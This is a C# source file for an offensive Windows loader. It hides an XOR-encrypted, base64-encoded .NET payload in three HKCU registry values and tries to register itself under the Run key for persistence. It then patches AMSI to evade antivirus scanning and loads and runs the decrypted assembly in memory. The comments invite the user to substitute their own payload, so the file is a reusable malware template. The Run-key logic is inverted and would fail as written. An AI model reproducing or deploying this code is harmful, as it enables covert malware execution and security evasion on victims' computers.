using ClrAmsiScanPatcher;
using Microsoft.Win32;
using System;
using System.Linq;
using System.Reflection;

namespace persistence
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string path = @"Software\pres";
            string exePath = Assembly.GetExecutingAssembly().Location;

            RegistryKey key = Registry.CurrentUser.OpenSubKey(path, true);

            if (key == null)
            {
                key = Registry.CurrentUser.CreateSubKey(path);

                key.SetValue("1", "ZHO5KSopKSktKSkp1tYpKZEpKSkpKSkpaSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpqSkpKSc2kycpnSDkCJEoZeQIfUFAWglZW0ZOW0hECUpIR0dGXQlLTAlbXEcJQEcJbWZ6CURGTUwHJCQjDSkpKSkpKSl5bCkpZSgqKcvqfNUpKSkpKSkpKckpCykiKBkpKSEpKSkhKSkpKSkpCw4pKSkJKSkpaSkpKSlpKSkJKSkpKykpLSkpKSkpKSkvKSkpKSkpKSmpKSkpKykpKSkpKSopSawpKTkpKTkpKSkpOSkpOSkpKSkpKTkpKSkpKSkpKSkpKeYPKSlmKSkpKWkpKZUsKSkpKSkpKSkpKSkpKSkpKSkpKUkpKSUpKSkdDykpESkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpCSkpISkpKSkpKSkpKSkpIQkpKWEpKSkpKSkpKSkpKQddTFFdKSkpAS4pKSkJKSkpISkpKSspKSkpKSkpKSkpKSkpKQkpKUkHW1pbSikpKZUsKSkpaSkpKS8pKSkjKSkpKSkpKSkpKSkpKSlpKSlpB1tMRUZKKSklKSkpKUkpKSkrKSkpOSkpKSkpKSkpKSkpKSkpaSkpaykpKSkpKSkpKSkpKSkpKSkqDikpKSkpKWEpKSkrKSwpTQkpKfksKSkqKSspKCkpLykpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKQdbKCkpWQEmKSkjAzcrATkpKSMDa3pjaygpKCkpKSkpJSkpKV8dBxkHGhkaGBApKSkpLClFKSkp5SgpKQpXKSkRKykpdSspKQp6XVtAR05aKSkpKb0tKSk1KSkpCnx6KZktKSk5KSkpCm58YG0pKSnpLSkpOSgpKQprRUZLKSkpKSkpKSspKShuPCkpICkpKSnTKBopPykpKCkpKTgpKSkrKSkpKykpKSgpKSk5KSkpJykpKSgpKSkoKSkpKSm/KCgpKSkpKS8pIig3Ky8pUSg3Ky8pFinFKCYpFyspKS8pTin9KC8pxyn9KC8p5in9KC8pdij9KC8pAij9KC8pbSj9KC8pVyn9KC8peinWKC8pGCnWKC8pmyn9KC8psCmPKC8peyvhKC8pNinhKCkpKSkkKSkpKSkoKSgpKSk5KekoKCloKSgpKCl5CSkpKSm4KeYoASkoKXUJKSkpKa8xzygvKSspKSkoKWQrICnPKCgpOCnPKC8pMCnPKCMpACnPKDkpGCnPKDkpECnPKDkpaCnPKDkpYCnPKDkpeCnPKDkpcCnPKDkpSCnPKDwpQCnPKDkpWCnPKDkpUCnPKDkpoCkOKTMpqCnPKC8pBykiKQcpByk6KR4pBykyKX8pBykKKXYpBykCKVkpBykaKVkpBykSKVkpBylqKXYpByliKV8pByl6KVkpBylyKVkpBylKKacpBylCKZEpBylaKewpLakpKSgpKSkpKSkpKSkpKSkpKCkpKS0pKSkpKSkpKSkpKTYpPykpKSkpKSkpKSlqRkdaRkVMaFlZGykVZEZNXEVMFylEWkpGW0VASylqRkdaRkVMKX5bQF1MZUBHTCluXEBNaF1dW0BLXF1MKW1MS1xOTkhLRUxoXV1bQEtcXUwpakZEf0BaQEtFTGhdXVtAS1xdTCloWlpMREtFUH1AXUVMaF1dW0BLXF1MKWhaWkxES0VQfVtITUxESFtCaF1dW0BLXF1MKX1IW05MXW9bSERMXkZbQmhdXVtAS1xdTCloWlpMREtFUG9ARUx/TFtaQEZHaF1dW0BLXF1MKWhaWkxES0VQakZHT0BOXFtIXUBGR2hdXVtAS1xdTCloWlpMREtFUG1MWkpbQFldQEZHaF1dW0BLXF1MKWpGRFlARUhdQEZHe0xFSFFIXUBGR1poXV1bQEtcXUwpaFpaTERLRVB5W0ZNXEpdaF1dW0BLXF1MKWhaWkxES0VQakZZUFtATkFdaF1dW0BLXF1MKWhaWkxE"); //
                key.SetValue("2", "S0VQakZEWUhHUGhdXVtAS1xdTCl7XEddQERMakZEWUhdQEtARUBdUGhdXVtAS1xdTClqRkdaRkVMaFlZGwdMUUwpelBaXUxEB3tcR11AREwHf0xbWkBGR0BHTil5W0ZOW0hEKXpQWl1MRClkSEBHKXpQWl1MRAd7TE9FTEpdQEZHKQdKXUZbKXpQWl1MRAdtQEhOR0ZaXUBKWil6UFpdTEQHe1xHXUBETAdgR11MW0ZZekxbX0BKTFopelBaXUxEB3tcR11AREwHakZEWUBFTFt6TFtfQEpMWiltTEtcTk5AR05kRk1MWilIW05aKWZLQ0xKXSkpKSkpPkEpTClFKUUpRikJKV4pRilbKUUpTSkpKSkpY2jB8OKdm2WUwl7WTJcgxSktCSgoISoJKSgsCSgoODgtCSgoJy0JKCgrLSkoKCchnlN1fzAdyaAsKSgoNCchKCkhKSkpKSk3KCkoKX0rP35bSFlnRkdsUUpMWV1ARkd9QVtGXlooISgpKykpKSkpOSgpImpGR1pGRUxoWVkbKSksKCkpKSk+KCk7akZZUFtATkFdCeuACQkbGRsfKSkAKCkNTR8dH0xNS0gEH08RGwQdEBpIBBEcGhsEEEgeGxwaGEtMShAdKSklKCkuGAcZBxkHGSkpYCgpMwdnbH1vW0hETF5GW0IFf0xbWkBGRxRfHQcRKCl9Jz1vW0hETF5GW0JtQFpZRUhQZ0hETDsHZ2x9CW9bSERMXkZbQgkdBxEpKSkpKVzMIN4pKSkpKykpKUopKSlFDykpRSEpKSkpKSkpKSkpKSkpKTkpKSkpKSkpKSkpKSkpKSl7em16aPDJ5wqCtm2k7/rC6p4mlCgpKSlqE3V8WkxbWnVITURAR3VtTFpCXUZZdWpGR1pGRUxoWVkbdWpGR1pGRUxoWVkbdUZLQ3V7TEVMSFpMdWpGR1pGRUxoWVkbB1lNSyneDykpKSkpKSkpKSk4DikpKQkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKg4pKSkpKSkpKSkpKSl2akZbbFFMZEhARylEWkpGW0xMB01FRSkpKSkpKdYMKQlpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKyk5KSkpCSkpqTEpKSl5KSmpKSkpKSkpKSkpKSkpKSkoKSgpKSkRKSmpKSkpKSkpKSkpKSkpKSkoKSkpKSmpKSkpKSkpKSkpKSkpKSkpKSkoKSgpKSlBKSmpKSkpKSkpKSkpKSkpKSkoKSkpKSmVKikpuWkpKQUqKSkpKSkpKSkpKQUqHSkpKX8peil2KX8pbCl7KXopYClmKWcpdilgKWcpbylmKSkpKSmULcbXKSkoKSkpKCkpKSkpKSkoKSkpKSkWKSkpKSkpKS0pKSkoKSkpKSkpKSkpKSkpKSkpbSkpKSgpfylIKVspbylAKUUpTClgKUcpTylGKSkpKSkNKS0pKSl9KVspSClHKVopRSlIKV0pQClGKUcpKSkpKSkpmS2lKykpKCl6KV0pWylAKUcpTilvKUApRSlMKWApRylPKUYpKSlBKykpKCkZKRkpGSkZKRkpHSlLKRkpKSkzKSgpKClqKUYpRClEKUwpRyldKVopKSkpKSkpCykoKSgpailGKUQpWSlIKUcpUClnKUgpRClMKSkpKSkpKSkpaSklKSgpbylAKUUpTCltKUwpWilKKVspQClZKV0pQClGKUcpKSkpKWopRilHKVopRilFKUwpaClZKVkpGykpKRkpISkoKW8pQClFKUwpfylMKVsp"); // Bytes of your payload, expected to be split in 3 parts and XOR encrypted.
                key.SetValue("3", "WilAKUYpRykpKSkpGCkHKRkpBykZKQcpGSkpKWkpOSkoKWApRyldKUwpWylHKUgpRSlnKUgpRClMKSkpailGKUcpWilGKUUpTCloKVkpWSkbKQcpTClRKUwpKSlhKTspKCllKUwpTilIKUUpailGKVkpUClbKUApTilBKV0pKSlqKUYpWSlQKVspQClOKUEpXSkJKYApCSkJKRspGSkbKR8pKSkDKSgpKCllKUwpTilIKUUpfSlbKUgpTSlMKUQpSClbKUIpWikpKSkpKSkpKWEpOSkoKWYpWylAKU4pQClHKUgpRSlvKUApRSlMKUcpSClEKUwpKSlqKUYpRylaKUYpRSlMKWgpWSlZKRspBylMKVEpTCkpKREpJSkoKXkpWylGKU0pXClKKV0pZylIKUQpTCkpKSkpailGKUcpWilGKUUpTCloKVkpWSkbKSkpHSkhKSgpeSlbKUYpTSlcKUopXSl/KUwpWylaKUApRilHKSkpGCkHKRkpBykZKQcpGSkpKREpISkoKWgpWilaKUwpRClLKUUpUCkJKX8pTClbKVopQClGKUcpKSkYKQcpGSkHKRkpBykZKSkp5WopKcMoKSkpKSkpKSkpKcaSlhUWUURFCV9MW1pARkcUCxgHGQsJTEdKRk1AR04UC3x9bwQRCwlaXUhHTUhFRkdMFAtQTFoLFhckIyQjFUhaWkxES0VQCVFERUdaFAtcW0cTWkpBTERIWgREQEpbRlpGT10ESkZEE0haRAdfGAsJREhHQE9MWl1/TFtaQEZHFAsYBxkLFyQjCQkVSFpaTERLRVBgTUxHXUBdUAlfTFtaQEZHFAsYBxkHGQcZCwlHSERMFAtkUGhZWUVASkhdQEZHB0hZWQsGFyQjCQkVXVtcWl1gR09GCVFERUdaFAtcW0cTWkpBTERIWgREQEpbRlpGT10ESkZEE0haRAdfGwsXJCMJCQkJFVpMSlxbQF1QFyQjCQkJCQkJFVtMWFxMWl1MTXlbQF9ARUxOTFoJUURFR1oUC1xbRxNaSkFMREhaBERASltGWkZPXQRKRkQTSFpEB18aCxckIwkJCQkJCQkJFVtMWFxMWl1MTWxRTEpcXUBGR2VMX0xFCUVMX0xFFAtIWmBHX0ZCTFsLCVxAaEpKTFpaFAtPSEVaTAsGFyQjCQkJCQkJFQZbTFhcTFpdTE15W0BfQEVMTkxaFyQjCQkJCRUGWkxKXFtAXVAXJCMJCRUGXVtcWl1gR09GFyQjFQZIWlpMREtFUBcpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkJKSklKSkpDR4pKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkp"); //

            }

            RegistryKey runKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);

            if (runKey == null)
            {
                runKey.SetValue("Pres", exePath);
            }

            runKey.Close();

            byte xorKey = 41; // XOR key make sure your payload has the same one, otherwise the decryption will fail and the payload won't execute.
            var parts = key.GetValueNames()
                            .OrderBy(x => x)
                            .Select(x => key.GetValue(x)?.ToString())
                            .Where(x => !string.IsNullOrEmpty(x));

            string fullBase64 = string.Concat(parts);

            byte[] encryptedBytes = Convert.FromBase64String(fullBase64);

            for (int i = 0; i < encryptedBytes.Length; i++)
            {
                encryptedBytes[i] ^= xorKey;
            }

            key.Close();

            // Patching AMSI scan function to avoid detection of the payload in memory since AMSI monitors Assembly.Load
            AmsiPatcher patcher = new AmsiPatcher();
            patcher.Initialize();
            patcher.Patch();

            // NOTE: never use Assembly.Load without patching AMSI before 
            Assembly asm = Assembly.Load(encryptedBytes);
            asm.EntryPoint?.Invoke(null, new object[] { new string[0] });

            
            Console.WriteLine("\nDone.");
            Console.ReadLine();
        }
    }
}
